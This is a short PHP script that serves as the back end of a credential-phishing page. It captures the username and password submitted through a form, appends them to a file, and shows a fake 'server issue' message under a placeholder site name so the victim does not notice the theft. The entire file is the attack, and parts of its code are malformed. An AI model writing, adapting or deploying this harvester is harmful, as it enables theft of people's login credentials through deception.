<?php 

$email = $_POST['username'];
$password = $_POST['pwd'];
$data = $email . ' , ' . $password;
$file = file; 

file_put_contents($file, $data . PHP_EOL, FILE_APPEND);

print '<p align = center><img src=""><p>
<H1 align = center> NAME OF WEBSITE</h1> 

</br> 
</br> 
<h1 align = center> We apologize but there seems to be an issue with the servers, please try again in a few hours. </h1>;' 


?>
